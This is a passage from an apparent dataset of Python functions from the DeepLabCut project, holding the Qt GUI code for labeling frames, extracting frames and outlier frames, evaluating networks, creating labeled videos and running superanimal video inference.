    self.root.logger.info(f'Coloring keypoints in videos by {text}')"
AlexEMG/DeepLabCut,update_filter_choice,"def update_filter_choice(self, rb):
    self.filtered = rb.text() == 'Yes'"
AlexEMG/DeepLabCut,update_video_slow_choice,"def update_video_slow_choice(self, rb):
    self.slow = rb.text() == 'Yes'"
AlexEMG/DeepLabCut,update_draw_skeleton_choice,"def update_draw_skeleton_choice(self, rb):
    self.draw = rb.text() == 'Yes'"
AlexEMG/DeepLabCut,create_videos,"def create_videos(self):
    config = self.root.config
    shuffle = self.root.shuffle_value
    videos = self.files
    trailpoints = self.trail_points.value()
    if hasattr(self, 'color_by_widget'):
        color_by = self.color_by_widget.currentText()
    else:
        color_by = 'bodypart'
    filtered = bool(self.use_filtered_data_checkbox.checkState())
    bodyparts = 'all'
    if len(self.bodyparts_to_use) != 0 and self.plot_all_bodyparts.checkState() != Qt.Checked:
        self.update_selected_bodyparts()
        bodyparts = self.bodyparts_to_use
    videos_created = deeplabcut.create_labeled_video(config=config, videos=videos, shuffle=shuffle, filtered=filtered, save_frames=bool(self.create_high_quality_video.checkState()), displayedbodyparts=bodyparts, draw_skeleton=bool(self.draw_skeleton_checkbox.checkState()), trailpoints=trailpoints, color_by=color_by)
    if all(videos_created):
        self.root.writer.write('Labeled videos created.')
    else:
        failed_videos = [video for (success, video) in zip(videos_created, videos) if not success]
        failed_videos_str = ', '.join(failed_videos)
        self.root.writer.write(f'Failed to create videos from {failed_videos_str}.')
    if self.plot_trajectories.checkState():
        deeplabcut.plot_trajectories(config=config, videos=videos, shuffle=shuffle, filtered=filtered, displayedbodyparts=bodyparts)"
AlexEMG/DeepLabCut,build_skeleton,"def build_skeleton(self, *args):
    from deeplabcut.gui.widgets import SkeletonBuilder
    SkeletonBuilder(self.root.config)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, image_paths, parent=None):
    super().__init__(parent)
    self.image_paths = image_paths
    layout = QtWidgets.QVBoxLayout(self)
    self.figure = Figure()
    self.figure.patch.set_facecolor('None')
    self.grid = self.figure.add_gridspec(3, 3)
    self.canvas = FigureCanvas(self.figure)
    layout.addWidget(self.canvas)
    for (image_path, gridspec) in zip(image_paths[:9], self.grid):
        ax = self.figure.add_subplot(gridspec)
        ax.set_axis_off()
        img = mpimg.imread(image_path)
        ax.imshow(img)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent, h1_description):
    super(EvaluateNetwork, self).__init__(root, parent, h1_description)
    self.bodyparts_to_use = self.root.all_bodyparts
    self._set_page()"
AlexEMG/DeepLabCut,_set_page,"def _set_page(self):
    self.main_layout.addWidget(_create_label_widget('Attributes', 'font:bold'))
    self.layout_attributes = _create_horizontal_layout()
    self._generate_layout_attributes(self.layout_attributes)
    self.main_layout.addLayout(self.layout_attributes)
    self.main_layout.addWidget(_create_label_widget(''))
    self.layout_additional_attributes = _create_vertical_layout()
    self._generate_additional_attributes(self.layout_additional_attributes)
    self.main_layout.addLayout(self.layout_additional_attributes)
    self.ev_nw_button = QtWidgets.QPushButton('Evaluate Network')
    self.ev_nw_button.setMinimumWidth(150)
    self.ev_nw_button.clicked.connect(self.evaluate_network)
    self.opt_button = QtWidgets.QPushButton('Plot 3 test maps')
    self.opt_button.setMinimumWidth(150)
    self.opt_button.clicked.connect(self.plot_maps)
    self.edit_inferencecfg_btn = QtWidgets.QPushButton('Edit inference_cfg.yaml')
    self.edit_inferencecfg_btn.setMinimumWidth(150)
    self.edit_inferencecfg_btn.clicked.connect(self.open_inferencecfg_editor)
    if self.root.is_multianimal:
        self.main_layout.addWidget(self.edit_inferencecfg_btn, alignment=Qt.AlignRight)
    self.main_layout.addWidget(self.ev_nw_button, alignment=Qt.AlignRight)
    self.main_layout.addWidget(self.opt_button, alignment=Qt.AlignRight)
    self.help_button = QtWidgets.QPushButton('Help')
    self.help_button.clicked.connect(self.show_help_dialog)
    self.main_layout.addWidget(self.help_button, alignment=Qt.AlignLeft)"
AlexEMG/DeepLabCut,show_help_dialog,"def show_help_dialog(self):
    dialog = QtWidgets.QDialog(self)
    layout = QtWidgets.QVBoxLayout()
    label = QtWidgets.QLabel(deeplabcut.evaluate_network.__doc__, self)
    scroll = QtWidgets.QScrollArea()
    scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
    scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
    scroll.setWidgetResizable(True)
    scroll.setWidget(label)
    layout.addWidget(scroll)
    dialog.setLayout(layout)
    dialog.exec_()"
AlexEMG/DeepLabCut,_generate_layout_attributes,"def _generate_layout_attributes(self, layout):
    opt_text = QtWidgets.QLabel('Shuffle')
    self.shuffle = ShuffleSpinBox(root=self.root, parent=self)
    layout.addWidget(opt_text)
    layout.addWidget(self.shuffle)"
AlexEMG/DeepLabCut,open_inferencecfg_editor,"def open_inferencecfg_editor(self):
    editor = ConfigEditor(self.root.inference_cfg_path)
    editor.show()"
AlexEMG/DeepLabCut,plot_maps,"def plot_maps(self):
    shuffle = self.root.shuffle_value
    config = self.root.config
    deeplabcut.extract_save_all_maps(config, shuffle=shuffle, Indices=[0, 1, 2])
    dest_folder = os.path.join(self.root.project_folder, str(get_evaluation_folder(self.root.cfg['TrainingFraction'][0], shuffle, self.root.cfg)), 'maps')
    image_paths = [os.path.join(dest_folder, file) for file in os.listdir(dest_folder) if file.endswith('.png')]
    canvas = GridCanvas(image_paths, parent=self)
    canvas.show()"
AlexEMG/DeepLabCut,_generate_additional_attributes,"def _generate_additional_attributes(self, layout):
    tmp_layout = _create_horizontal_layout(margins=(0, 0, 0, 0))
    self.plot_predictions = QtWidgets.QCheckBox('Plot predictions (as in standard DLC projects)')
    self.plot_predictions.stateChanged.connect(self.update_plot_predictions)
    tmp_layout.addWidget(self.plot_predictions)
    self.bodyparts_list_widget = BodypartListWidget(root=self.root, parent=self)
    self.use_all_bodyparts = QtWidgets.QCheckBox('Compare all bodyparts')
    self.use_all_bodyparts.stateChanged.connect(self.update_bodypart_choice)
    self.use_all_bodyparts.setCheckState(Qt.Checked)
    tmp_layout.addWidget(self.use_all_bodyparts)
    layout.addLayout(tmp_layout)
    layout.addWidget(self.bodyparts_list_widget, alignment=Qt.AlignLeft)"
AlexEMG/DeepLabCut,update_map_choice,"def update_map_choice(self, state):
    if state == Qt.Checked:
        self.root.logger.info('Plot scoremaps ENABLED')
    else:
        self.root.logger.info('Plot predictions DISABLED')"
AlexEMG/DeepLabCut,update_plot_predictions,"def update_plot_predictions(self, s):
    if s == Qt.Checked:
        self.root.logger.info('Plot predictions ENABLED')
    else:
        self.root.logger.info('Plot predictions DISABLED')"
AlexEMG/DeepLabCut,update_bodypart_choice,"def update_bodypart_choice(self, s):
    if s == Qt.Checked:
        self.bodyparts_list_widget.setEnabled(False)
        self.bodyparts_list_widget.hide()
        self.root.logger.info('Use all bodyparts')
    else:
        self.bodyparts_list_widget.setEnabled(True)
        self.bodyparts_list_widget.show()
        self.root.logger.info(f'Use selected bodyparts only: {self.bodyparts_list_widget.selected_bodyparts}')"
AlexEMG/DeepLabCut,evaluate_network,"def evaluate_network(self):
    config = self.root.config
    Shuffles = [self.root.shuffle_value]
    plotting = self.plot_predictions.checkState() == Qt.Checked
    bodyparts_to_use = 'all'
    if len(self.root.all_bodyparts) != len(self.bodyparts_list_widget.selected_bodyparts) and self.use_all_bodyparts.checkState() == False:
        bodyparts_to_use = self.bodyparts_list_widget.selected_bodyparts
    deeplabcut.evaluate_network(config, Shuffles=Shuffles, plotting=plotting, show_errors=True, comparisonbodyparts=bodyparts_to_use)"
AlexEMG/DeepLabCut,select_cropping_area,"def select_cropping_area(config, videos=None):
    """"""
    Interactively select the cropping area of all videos in the config.
    A user interface pops up with a frame to select the cropping parameters.
    Use the left click to draw a box and hit the button 'set cropping parameters'
    to store the cropping parameters for a video in the config.yaml file.

    Parameters
    ----------
    config : string
        Full path of the config.yaml file as a string.

    videos : optional (default=None)
        List of videos whose cropping areas are to be defined. Note that full paths are required.
        By default, all videos in the config are successively loaded.

    Returns
    -------
    cfg : dict
        Updated project configuration
    """"""
    from deeplabcut.utils import auxiliaryfunctions
    from deeplabcut.gui.widgets import FrameCropper
    cfg = auxiliaryfunctions.read_config(config)
    if videos is None:
        videos = list(cfg.get('video_sets_original') or cfg['video_sets'])
    for video in videos:
        fc = FrameCropper(video)
        coords = fc.draw_bbox()
        if coords:
            temp = {'crop': ', '.join(map(str, [int(coords[0]), int(coords[2]), int(coords[1]), int(coords[3])]))}
            try:
                cfg['video_sets'][video] = temp
            except KeyError:
                cfg['video_sets_original'][video] = temp
    auxiliaryfunctions.write_config(config, cfg)
    return cfg"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent, h1_description):
    super(ExtractFrames, self).__init__(root, parent, h1_description)
    self._set_page()"
AlexEMG/DeepLabCut,_set_page,"def _set_page(self):
    self.main_layout.addWidget(_create_label_widget('Attributes', 'font:bold'))
    self.layout_attributes = _create_grid_layout(margins=(0, 0, 0, 0))
    self._generate_layout_attributes(self.layout_attributes)
    self.main_layout.addLayout(self.layout_attributes)
    self.main_layout.addWidget(_create_label_widget('Optional: frame extraction from a video subset', 'font:bold'))
    self.video_selection_widget = VideoSelectionWidget(self.root, self)
    self.main_layout.addWidget(self.video_selection_widget)
    self.ok_button = QtWidgets.QPushButton('Extract Frames')
    self.ok_button.clicked.connect(self.extract_frames)
    self.main_layout.addWidget(self.ok_button, alignment=Qt.AlignRight)
    self.help_button = QtWidgets.QPushButton('Help')
    self.help_button.clicked.connect(self.show_help_dialog)
    self.main_layout.addWidget(self.help_button, alignment=Qt.AlignLeft)"
AlexEMG/DeepLabCut,show_help_dialog,"def show_help_dialog(self):
    dialog = QtWidgets.QDialog(self)
    layout = QtWidgets.QVBoxLayout()
    label = QtWidgets.QLabel(extract_frames.__doc__, self)
    scroll = QtWidgets.QScrollArea()
    scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
    scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
    scroll.setWidgetResizable(True)
    scroll.setWidget(label)
    layout.addWidget(scroll)
    dialog.setLayout(layout)
    dialog.exec_()"
AlexEMG/DeepLabCut,_generate_layout_attributes,"def _generate_layout_attributes(self, layout):
    layout.setColumnMinimumWidth(1, 300)
    ext_method_label = QtWidgets.QLabel('Extraction method')
    self.extraction_method_widget = QtWidgets.QComboBox()
    options = ['automatic', 'manual']
    self.extraction_method_widget.addItems(options)
    self.extraction_method_widget.currentTextChanged.connect(self.log_extraction_method)
    ext_algo_label = QtWidgets.QLabel('Extraction algorithm')
    self.extraction_algorithm_widget = QtWidgets.QComboBox()
    self.extraction_algorithm_widget.addItems(DLCParams.FRAME_EXTRACTION_ALGORITHMS)
    self.extraction_algorithm_widget.currentTextChanged.connect(self.log_extraction_algorithm)
    frame_crop_label = QtWidgets.QLabel('Frame cropping')
    self.frame_cropping_widget = QtWidgets.QComboBox()
    self.frame_cropping_widget.addItems(['disabled', 'read from config', 'GUI'])
    self.frame_cropping_widget.currentTextChanged.connect(self.log_frame_cropping_choice)
    cluster_step_label = QtWidgets.QLabel('Cluster step')
    self.cluster_step_widget = QtWidgets.QSpinBox()
    self.cluster_step_widget.setValue(1)
    gui_slider_label = QtWidgets.QLabel('GUI slider width')
    self.slider_width_widget = QtWidgets.QSpinBox()
    self.slider_width_widget.setValue(25)
    self.slider_width_widget.setEnabled(False)
    layout.addWidget(ext_method_label, 1, 0)
    layout.addWidget(self.extraction_method_widget, 1, 1)
    layout.addWidget(gui_slider_label, 1, 2)
    layout.addWidget(self.slider_width_widget, 1, 3)
    layout.addWidget(ext_algo_label, 2, 0)
    layout.addWidget(self.extraction_algorithm_widget, 2, 1)
    layout.addWidget(cluster_step_label, 2, 2)
    layout.addWidget(self.cluster_step_widget, 2, 3)
    layout.addWidget(frame_crop_label, 3, 0)
    layout.addWidget(self.frame_cropping_widget, 3, 1)"
AlexEMG/DeepLabCut,log_extraction_algorithm,"def log_extraction_algorithm(self, extraction_algorithm):
    self.root.logger.info(f'Extraction method set to {extraction_algorithm}')"
AlexEMG/DeepLabCut,log_extraction_method,"def log_extraction_method(self, extraction_method):
    self.root.logger.info(f'Extraction method set to {extraction_method}')
    if extraction_method == 'manual':
        self.extraction_algorithm_widget.setEnabled(False)
        self.cluster_step_widget.setEnabled(False)
        self.frame_cropping_widget.setEnabled(False)
        self.slider_width_widget.setEnabled(True)
    else:
        self.extraction_algorithm_widget.setEnabled(True)
        self.cluster_step_widget.setEnabled(True)
        self.frame_cropping_widget.setEnabled(True)
        self.slider_width_widget.setEnabled(False)"
AlexEMG/DeepLabCut,log_frame_cropping_choice,"def log_frame_cropping_choice(self, cropping_option):
    self.root.logger.info(f""Cropping set to '{cropping_option}'"")"
AlexEMG/DeepLabCut,extract_frames,"def extract_frames(self):
    config = self.root.config
    mode = self.extraction_method_widget.currentText()
    if mode == 'manual':
        _ = launch_napari(list(self.video_selection_widget.files)[0])
        return
    algo = self.extraction_algorithm_widget.currentText()
    clusterstep = self.cluster_step_widget.value()
    slider_width = self.slider_width_widget.value()
    crop = False
    if self.frame_cropping_widget.currentText() == 'GUI':
        _ = select_cropping_area(config)
        crop = True
    elif self.frame_cropping_widget.currentText() == 'read from config':
        crop = True
    func = partial(extract_frames, config, mode, algo, crop=crop, cluster_step=clusterstep, cluster_resizewidth=30, cluster_color=False, slider_width=slider_width, userfeedback=False, videos_list=self.video_selection_widget.files or None)
    (self.worker, self.thread) = move_to_separate_thread(func)
    self.worker.finished.connect(lambda : self.ok_button.setEnabled(True))
    self.worker.finished.connect(lambda : self.root._progress_bar.hide())
    self.thread.finished.connect(self._show_success_message)
    self.thread.start()
    self.ok_button.setEnabled(False)
    self.root._progress_bar.show()"
AlexEMG/DeepLabCut,_show_success_message,"def _show_success_message(self):
    msg = QtWidgets.QMessageBox()
    msg.setIcon(QtWidgets.QMessageBox.Information)
    msg.setText('Frames were successfully extracted, for the videos of interest.')
    msg.setWindowTitle('Info')
    msg.setStandardButtons(QtWidgets.QMessageBox.Ok)
    msg.exec_()
    self.root.writer.write('Frames successfully extracted.')"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent, h1_description):
    super(ExtractOutlierFrames, self).__init__(root, parent, h1_description)
    self.filelist = []
    self._set_page()"
AlexEMG/DeepLabCut,files,"@property
def files(self):
    return self.video_selection_widget.files"
AlexEMG/DeepLabCut,_set_page,"def _set_page(self):
    self.main_layout.addWidget(_create_label_widget('Video Selection', 'font:bold'))
    self.video_selection_widget = VideoSelectionWidget(self.root, self)
    self.main_layout.addWidget(self.video_selection_widget)
    self.main_layout.addWidget(_create_label_widget('Attributes', 'font:bold'))
    self.layout_attributes = _create_horizontal_layout()
    self._generate_layout_attributes(self.layout_attributes)
    self._generate_multianimal_options(self.layout_attributes)
    self.main_layout.addLayout(self.layout_attributes)
    self.main_layout.addWidget(_create_label_widget('Frame extraction options', 'font:bold'))
    self.layout_extraction_options = _create_horizontal_layout()
    self._generate_layout_extraction_options(self.layout_extraction_options)
    self.main_layout.addLayout(self.layout_extraction_options)
    self.extract_outlierframes_button = QtWidgets.QPushButton('Extract frames')
    self.extract_outlierframes_button.clicked.connect(self.extract_outlier_frames)
    self.extract_outlierframes_button.setMinimumWidth(150)
    self.label_outliers_button = QtWidgets.QPushButton('Labeling GUI')
    self.label_outliers_button.setEnabled(True)
    self.label_outliers_button.clicked.connect(self.launch_refinement_gui)
    self.label_outliers_button.setMinimumWidth(150)
    self.merge_data_button = QtWidgets.QPushButton('Merge data')
    self.merge_data_button.clicked.connect(self.merge_dataset)
    self.merge_data_button.setMinimumWidth(150)
    self.main_layout.addWidget(self.extract_outlierframes_button, alignment=Qt.AlignRight)
    self.main_layout.addWidget(self.label_outliers_button, alignment=Qt.AlignRight)
    self.main_layout.addWidget(self.merge_data_button, alignment=Qt.AlignRight)
    self.help_button = QtWidgets.QPushButton('Help')
    self.help_button.clicked.connect(self.show_help_dialog)
    self.main_layout.addWidget(self.help_button, alignment=Qt.AlignLeft)"
AlexEMG/DeepLabCut,show_help_dialog,"def show_help_dialog(self):
    dialog = QtWidgets.QDialog(self)
    layout = QtWidgets.QVBoxLayout()
    label = QtWidgets.QLabel(deeplabcut.extract_outlier_frames.__doc__, self)
    scroll = QtWidgets.QScrollArea()
    scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
    scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
    scroll.setWidgetResizable(True)
    scroll.setWidget(label)
    layout.addWidget(scroll)
    dialog.setLayout(layout)
    dialog.exec_()"
AlexEMG/DeepLabCut,_generate_layout_attributes,"def _generate_layout_attributes(self, layout):
    opt_text = QtWidgets.QLabel('Shuffle')
    self.shuffle = ShuffleSpinBox(root=self.root, parent=self)
    layout.addWidget(opt_text)
    layout.addWidget(self.shuffle)"
AlexEMG/DeepLabCut,_generate_multianimal_options,"def _generate_multianimal_options(self, layout):
    opt_text = QtWidgets.QLabel('Tracking method')
    self.tracker_type_widget = QtWidgets.QComboBox()
    self.tracker_type_widget.addItems(DLCParams.TRACKERS)
    self.tracker_type_widget.currentTextChanged.connect(self.update_tracker_type)
    layout.addWidget(opt_text)
    layout.addWidget(self.tracker_type_widget)
    if not self.root.is_multianimal:
        opt_text.hide()
        self.tracker_type_widget.hide()"
AlexEMG/DeepLabCut,_generate_layout_extraction_options,"def _generate_layout_extraction_options(self, layout):
    opt_text = QtWidgets.QLabel('Specify the algorithm')
    self.outlier_algorithm_widget = QtWidgets.QComboBox()
    self.outlier_algorithm_widget.addItems(DLCParams.OUTLIER_EXTRACTION_ALGORITHMS)
    self.outlier_algorithm_widget.setMinimumWidth(200)
    self.outlier_algorithm_widget.currentTextChanged.connect(self.update_outlier_algorithm)
    layout.addWidget(opt_text)
    layout.addWidget(self.outlier_algorithm_widget)"
AlexEMG/DeepLabCut,update_tracker_type,"def update_tracker_type(self, method):
    self.root.logger.info(f'Using {method.upper()} tracker')"
AlexEMG/DeepLabCut,update_outlier_algorithm,"def update_outlier_algorithm(self, algorithm):
    self.root.logger.info(f'Using {algorithm.upper()} algorithm for frame extraction')"
AlexEMG/DeepLabCut,extract_outlier_frames,"def extract_outlier_frames(self):
    config = self.root.config
    shuffle = self.root.shuffle_value
    videos = self.files
    videotype = self.video_selection_widget.videotype_widget.currentText()
    outlieralgorithm = self.outlier_algorithm_widget.currentText()
    track_method = ''
    if self.root.is_multianimal:
        track_method = self.tracker_type_widget.currentText()
    self.root.logger.debug(f'Running extract outlier frames with options:\n        config: {config},\n        shuffle: {shuffle},\n        videos: {videos},\n        videotype: {videotype},\n        outlier algorithm: {outlieralgorithm},\n        track method: {track_method}\n        ')
    deeplabcut.extract_outlier_frames(config=config, videos=videos, videotype=videotype, shuffle=shuffle, outlieralgorithm=outlieralgorithm, track_method=track_method, automatic=True)"
AlexEMG/DeepLabCut,launch_refinement_gui,"def launch_refinement_gui(self):
    self.merge_data_button.setEnabled(True)
    _ = launch_napari()"
AlexEMG/DeepLabCut,merge_dataset,"def merge_dataset(self):
    msg = QtWidgets.QMessageBox()
    msg.setIcon(QtWidgets.QMessageBox.Warning)
    msg.setText('Make sure that you have refined all the labels before merging the dataset.If you merge the dataset, you need to re-create the training dataset before you start the training. Are you ready to merge the dataset?')
    msg.setWindowTitle('Warning')
    msg.setStandardButtons(QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No)
    result = msg.exec_()
    if result == QtWidgets.QMessageBox.Yes:
        deeplabcut.merge_datasets(self.root.config, forceiterate=None)"
AlexEMG/DeepLabCut,label_frames,"def label_frames(config_path):
    _ = launch_napari(config_path)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent, h1_description):
    super(LabelFrames, self).__init__(root, parent, h1_description)
    self._set_page()"
AlexEMG/DeepLabCut,_set_page,"def _set_page(self):
    self.label_frames_btn = QtWidgets.QPushButton('Label Frames')
    self.label_frames_btn.clicked.connect(self.label_frames)
    self.check_labels_btn = QtWidgets.QPushButton('Check Labels')
    self.check_labels_btn.clicked.connect(self.check_labels)
    self.main_layout.addWidget(self.label_frames_btn, alignment=Qt.AlignLeft)
    self.main_layout.addWidget(self.check_labels_btn, alignment=Qt.AlignLeft)"
AlexEMG/DeepLabCut,log_color_by_option,"def log_color_by_option(self, choice):
    self.root.logger.info(f'Labeled images will by colored by {choice.upper()}')"
AlexEMG/DeepLabCut,label_frames,"def label_frames(self):
    dialog = QtWidgets.QFileDialog(self)
    dialog.setFileMode(QtWidgets.QFileDialog.Directory)
    dialog.setViewMode(QtWidgets.QFileDialog.Detail)
    dialog.setDirectory(os.path.join(os.path.dirname(self.root.config), 'labeled-data'))
    if dialog.exec_():
        folder = dialog.selectedFiles()[0]
        has_h5 = False
        for file in os.listdir(folder):
            if file.endswith('.h5'):
                has_h5 = True
                break
        if not has_h5:
            folder = [folder, self.root.config]
        _ = launch_napari(folder)"
AlexEMG/DeepLabCut,check_labels,"def check_labels(self):
    check_labels(self.root.config, visualizeindividuals=self.root.is_multianimal)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent, h1_description):
    super().__init__(root, parent, h1_description)
    self._set_page()
    self._videos = []"
AlexEMG/DeepLabCut,_set_page,"def _set_page(self):
    project_config_layout = _create_horizontal_layout()
    cfg_text = QLabel('Active config file:')
    self.cfg_line = QLineEdit()
    self.cfg_line.setText(self.root.config)
    self.cfg_line.textChanged[str].connect(self.root.update_cfg)
    browse_button = QPushButton('Browse')
    browse_button.setMaximumWidth(100)
    browse_button.clicked.connect(self.root._open_project)
    project_config_layout.addWidget(cfg_text)
    project_config_layout.addWidget(self.cfg_line)
    project_config_layout.addWidget(browse_button)
    self.main_layout.addLayout(project_config_layout)
    self.edit_btn = QPushButton('Edit config.yaml')
    self.edit_btn.setMinimumWidth(150)
    self.edit_btn.clicked.connect(self.open_config_editor)
    self.add_videos_btn = QPushButton('Add new videos')
    self.add_videos_btn.clicked.connect(self.add_new_videos)
    self.main_layout.addWidget(self.edit_btn, alignment=Qt.AlignRight)
    self.main_layout.addWidget(self.add_videos_btn, alignment=Qt.AlignRight)"
AlexEMG/DeepLabCut,open_config_editor,"def open_config_editor(self):
    editor = ConfigEditor(self.root.config)
    editor.show()"
AlexEMG/DeepLabCut,add_new_videos,"def add_new_videos(self):
    cwd = os.getcwd()
    files = QFileDialog.getOpenFileNames(self, 'Select videos to add to the project', cwd, f""Videos ({' *.'.join(DLCParams.VIDEOTYPES)[1:]})"")[0]
    if not files:
        return
    add_new_videos(self.root.config, files)"
AlexEMG/DeepLabCut,validate,"def validate(self, input_, pos):
    (state, input_, pos) = super().validate(input_, pos)
    self.validationChanged.emit(state)
    return (state, input_, pos)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent, h1_description):
    super().__init__(root, parent, h1_description)
    self._val_pattern = QRegularExpression('(\\d{3,5},\\s*)+\\d{3,5}')
    self._set_page()"
AlexEMG/DeepLabCut,files,"@property
def files(self):
    return self.video_selection_widget.files"
AlexEMG/DeepLabCut,_set_page,"def _set_page(self):
    self.main_layout.addWidget(_create_label_widget('Video Selection', 'font:bold'))
    self.video_selection_widget = VideoSelectionWidget(self.root, self)
    self.main_layout.addWidget(self.video_selection_widget)
    model_settings_layout = _create_grid_layout(margins=(20, 0, 0, 0))
    section_title = _create_label_widget('Supermodel Settings', 'font:bold', (0, 50, 0, 0))
    model_combo_text = QtWidgets.QLabel('Supermodel name')
    self.model_combo = QtWidgets.QComboBox()
    supermodels = parse_available_supermodels()
    self.model_combo.addItems(supermodels.keys())
    scales_label = QtWidgets.QLabel('Scale list')
    self.scales_line = QtWidgets.QLineEdit('', parent=self)
    self.scales_line.setPlaceholderText('Optionally input a list of integer sizes separated by commas...')
    validator = RegExpValidator(self._val_pattern, self)
    validator.validationChanged.connect(self._handle_validation_change)
    self.scales_line.setValidator(validator)
    tooltip_label = QtWidgets.QLabel()
    tooltip_label.setPixmap(QPixmap(os.path.join(BASE_DIR, 'assets', 'icons', 'help2.png')).scaledToWidth(30))
    tooltip_label.setToolTip('Approximate animal sizes in pixels, for spatial pyramid search. If left blank, defaults to video height +/- 50 pixels')
    self.adapt_checkbox = QtWidgets.QCheckBox('Use video adaptation')
    self.adapt_checkbox.setChecked(True)
    pseudo_threshold_label = QtWidgets.QLabel('Pseudo-label confidence threshold')
    self.pseudo_threshold_spinbox = QtWidgets.QDoubleSpinBox(decimals=2, minimum=0.01, maximum=1.0, singleStep=0.05, value=0.1, wrapping=True)
    self.pseudo_threshold_spinbox.setMaximumWidth(300)
    adapt_iter_label = QtWidgets.QLabel('Number of adaptation iterations')
    self.adapt_iter_spinbox = QtWidgets.QSpinBox()
    self.adapt_iter_spinbox.setRange(100, 10000)
    self.adapt_iter_spinbox.setValue(1000)
    self.adapt_iter_spinbox.setSingleStep(100)
    self.adapt_iter_spinbox.setGroupSeparatorShown(True)
    self.adapt_iter_spinbox.setMaximumWidth(300)
    model_settings_layout.addWidget(section_title, 0, 0)
    model_settings_layout.addWidget(model_combo_text, 1, 0)
    model_settings_layout.addWidget(self.model_combo, 1, 1)
    model_settings_layout.addWidget(scales_label, 2, 0)
    model_settings_layout.addWidget(self.scales_line, 2, 1)
    model_settings_layout.addWidget(tooltip_label, 2, 2)
    model_settings_layout.addWidget(self.adapt_checkbox, 3, 0)
    model_settings_layout.addWidget(pseudo_threshold_label, 4, 0)
    model_settings_layout.addWidget(self.pseudo_threshold_spinbox, 4, 1)
    model_settings_layout.addWidget(adapt_iter_label, 5, 0)
    model_settings_layout.addWidget(self.adapt_iter_spinbox, 5, 1)
    self.main_layout.addLayout(model_settings_layout)
    self.run_button = QtWidgets.QPushButton('Run')
    self.run_button.clicked.connect(self.run_video_adaptation)
    self.main_layout.addWidget(self.run_button, alignment=Qt.AlignRight)
    self.help_button = QtWidgets.QPushButton('Help')
    self.help_button.clicked.connect(self.show_help_dialog)
    self.main_layout.addWidget(self.help_button, alignment=Qt.AlignLeft)"
AlexEMG/DeepLabCut,show_help_dialog,"def show_help_dialog(self):
    dialog = QtWidgets.QDialog(self)
    layout = QtWidgets.QVBoxLayout()
    label = QtWidgets.QLabel(deeplabcut.video_inference_superanimal.__doc__, self)
    scroll = QtWidgets.QScrollArea()
    scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
    scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
    scroll.setWidgetResizable(True)
    scroll.setWidget(label)
    layout.addWidget(scroll)
    dialog.setLayout(layout)
    dialog.exec_()"
AlexEMG/DeepLabCut,_handle_validation_change,"def _handle_validation_change(self, state):
    if state == RegExpValidator.Invalid:
        color = 'red'
    elif state == RegExpValidator.Intermediate:
        color = 'gold'
    elif state == RegExpValidator.Acceptable:
        color = 'lime'
    self.scales_line.setStyleSheet(f'border: 1px solid {color}')
    QTimer.singleShot(500, lambda : self.scales_line.setStyleSheet(''))"
AlexEMG/DeepLabCut,run_video_adaptation,"def run_video_adaptation(self):
    videos = list(self.files)
    if not videos:
        msg = QtWidgets.QMessageBox()
        msg.setIcon(QtWidgets.QMessageBox.Critical)
        msg.setText('You must select a video file')
        msg.setWindowTitle('Error')
        msg.setMinimumWidth(400)
        msg.setStandardButtons(QtWidgets.QMessageBox.Ok)
        msg.exec_()
        return
    scales = []
    scales_ = self.scales_line.text()
    if scales_:
        if self.scales_line.validator().validate(scales_, 0)[0] == RegExpValidator.Acceptable:
            scales = list(map(int, scales_.split(',')))
    supermodel_name = self.model_combo.currentText()
    videotype = self.video_selection_widget.videotype_widget.currentText()
    func = partial(deeplabcut.video_inference_superanimal, videos, supermodel_name, videotype=videotype, video_adapt=self.adapt_checkbox.isChecked(), scale_list=scales, pseudo_threshold=self.pseudo_threshold_spinbox.value(), adapt_iterations=self.adapt_iter_spinbox.value())
    (self.worker, self.thread) = move_to_separate_thread(func)
    self.worker.finished.connect(lambda : self.run_button.setEnabled(True))
    self.worker.finished.connect(lambda : self.root._progress_bar.hide())
    self.thread.start()
    self.run_button.setEnabled(False)
    self.root._progress_bar.show()"
AlexEMG/DeepLabCut,__init__,"def __init__(self, parent):
    super(OpenProject, self).__init__(parent)
    self.setWindowTitle('Load Existing Project')
    self.config = None
    self.loaded = False
    main_layout = QtWidgets.QVBoxLayout(self)
    self.layout_open()
    self.ok_button = QtWidgets.QPushButton('Load')
    self.ok_button.setDefault(True)
    self.ok_button.clicked.connect(self.open_project)
    main_layout.addWidget(self.open_frame)
    main_layout.addWidget(self.ok_button, alignment=QtCore.Qt.AlignRight)"
AlexEMG/DeepLabCut,layout_open,"def layout_open(self):
    self.open_frame = QtWidgets.QFrame(self)
    self.open_frame.setFrameShape(self.open_frame.Shape.StyledPanel)
    self.open_frame.setLineWidth(0)
    self.open_frame.setMinimumWidth(600)
    open_label = QtWidgets.QLabel('Select the config file:', self.open_frame)
    self.open_line = QtWidgets.QLineEdit(self.open_frame)
    self.open_line.textChanged[str].connect(self.open_config_name)
    load_button = QtWidgets.QPushButton('Browse')
    load_button.clicked.connect(self.load_config)
    grid = QtWidgets.QGridLayout(self.open_frame)
    grid.setSpacing(30)
    grid.addWidget(open_label, 0, 0)
    grid.addWidget(self.open_line, 0, 1)
    grid.addWidget(load_button, 1, 1)
    return self.open_frame"
AlexEMG/DeepLabCut,open_config_name,"def open_config_name(self):
    self.open_line.text()"
AlexEMG/DeepLabCut,load_config,"def load_config(self):
    cwd = os.getcwd()
    config = QtWidgets.QFileDialog.getOpenFileName(self, 'Select a configuration file', cwd, 'Config files (*.yaml)')
    if not config:
        return
    self.config = config[0]
    self.open_line.setText(self.config)
    self.ok_button.setFocus()"
AlexEMG/DeepLabCut,open_project,"def open_project(self):
